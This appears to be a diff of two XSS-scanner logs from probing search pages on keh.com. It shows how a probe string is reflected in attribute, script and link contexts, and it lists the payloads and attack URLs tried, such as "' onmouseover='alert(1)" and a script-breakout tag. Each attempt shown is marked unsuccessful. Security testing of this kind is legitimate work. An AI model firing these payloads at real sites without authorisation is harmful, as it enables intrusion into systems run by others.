@@ -1,9 +1,9 @@
-https://www.keh.com/shop/shopby
+https://www.keh.com/sell/faq
 
 GET Params:[1]
 ['q']
 _______________________________________________________________________________________________________
-https://www.keh.com/shop/catalogsearch/result/?q=(uvw"xyz'yxz</zxy
+https://www.keh.com/sell/catalogsearch/result/?q=(uvw"xyz'yxz</zxy
 
 ----------------------------------------------------------------------------------
 Attribute Context: [1]
@@ -18,14 +18,14 @@ HTML Context: [3]
 ----------------------------------------------------------------------------------
 Script Context: [2]
 <script data-footer-js-skip="true">
-    pageLayer = [{"pageType":"search","searchQuery":"(uvw&quot;xyz'yxz&lt;\/zxy","numResults":0,"pageCatPag":"1","storeCode":"shop"}];
+    pageLayer = [{"pageType":"search","searchQuery":"(uvw&quot;xyz'yxz&lt;\/zxy","numResults":0,"pageCatPag":"1","storeCode":"sell"}];
     dataLayer =  (typeof(visitorLayer) != 'undefined')? pageLayer.concat(visitorLayer) : pageLayer;
 </script>
 <script>ScarabQueue.push(['searchTerm', '(uvw\"xyz\'yxz</zxy']);</script>
 
 ----------------------------------------------------------------------------------
 URI Context: [1]
-<a itemprop="item" class="breadcrumb-last" style="pointer-events: none;cursor: default;text-decoration: none;" href="https://www.keh.com/shop/catalogsearch/result?q=(uvw%22xyz'yxz%3C/zxy" title="Search results for: '(uvw&quot;xyz'yxz&lt;/zxy'">
+<a itemprop="item" class="breadcrumb-last" style="pointer-events: none;cursor: default;text-decoration: none;" href="https://www.keh.com/sell/catalogsearch/result?q=(uvw%22xyz'yxz%3C/zxy" title="Search results for: '(uvw&quot;xyz'yxz&lt;/zxy'">
 
 ----------------------------------------------------------------------------------
 
@@ -36,7 +36,7 @@ ATTR:		True	True	False	True	False
 Attack Payloads for ATTR
 ["' onmouseover='alert(1)"]
 
-ATTR Attack Url: https://www.keh.com/shop/catalogsearch/result/?q=' onmouseover='alert(1)
+ATTR Attack Url: https://www.keh.com/sell/catalogsearch/result/?q=' onmouseover='alert(1)
 
  ______ UnSuccessful with payload: ' onmouseover='alert(1)
 
@@ -66,7 +66,7 @@ SCRIPT:		True	True	True	False	False
 Attack Payloads for SCRIPT
 ['</script><script>alert(1)</script>']
 
-SCRIPT Attack Url: https://www.keh.com/shop/catalogsearch/result/?q=</script><script>alert(1)</script>
+SCRIPT Attack Url: https://www.keh.com/sell/catalogsearch/result/?q=</script><script>alert(1)</script>
 
  ______ UnSuccessful with payload: </script><script>alert(1)</script>
 
